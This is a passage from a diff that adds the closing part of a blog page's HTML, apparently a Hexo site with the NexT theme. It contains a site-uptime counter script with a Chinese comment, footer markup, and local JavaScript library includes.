+		var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
+		var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+		document.getElementById("sitetime").innerHTML=" 已安全运行"+/*diffYears+" 年 "+*/diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+	}/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+	siteTime();
+</script>
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script color='' opacity='' zIndex='' count='' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
